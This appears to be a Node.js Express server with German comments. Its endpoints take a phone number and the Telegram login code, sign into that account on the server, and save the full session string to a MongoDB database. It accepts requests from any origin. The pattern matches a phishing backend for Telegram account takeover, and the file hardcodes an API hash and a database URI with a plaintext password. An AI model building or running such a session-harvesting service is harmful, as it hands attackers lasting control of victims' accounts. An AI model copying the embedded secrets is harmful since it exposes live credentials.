const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0';

mongoose.connect(MONGO_URI).catch(console.error);
const SessionModel = mongoose.model('Session', new mongoose.Schema({ phone: String, session: String }));

const activeClients = new Map();

app.post('/send-code', async (req, res) => {
    try {
        const { phone } = req.body;
        // StringSession muss leer sein für den neuen Login-Flow
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 10 });
        await client.connect();
        
        const result = await client.sendCode({ apiId, apiHash }, phone);
        
        // Speichere Client-Instanz und Hash
        activeClients.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        
        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
    } catch (error) {
        console.error("SendCode Error:", error);
        res.status(400).json({ error: error.message });
    }
});

app.post('/verify-code', async (req, res) => {
    try {
        const { phone, code, phoneCodeHash } = req.body;
        const sessionData = activeClients.get(phone);

        if (!sessionData) {
            return res.status(400).json({ error: "Keine aktive Sitzung. Bitte neu starten." });
        }

        const { client } = sessionData;

        // Versuche das Signing
        await client.signIn({
            apiId,
            apiHash,
            phoneNumber: phone,
            phoneCode: code,
            phoneCodeHash: phoneCodeHash
        });

        // Speichere die Session, wenn SignIn erfolgreich
        const stringSession = client.session.save();
        await SessionModel.create({ phone, session: stringSession });
        
        activeClients.delete(phone); // Sauber machen
        res.json({ success: true });
    } catch (error) {
        console.error("Verify Error:", error);
        res.status(400).json({ error: error.message });
    }
});

app.listen(process.env.PORT || 3000);
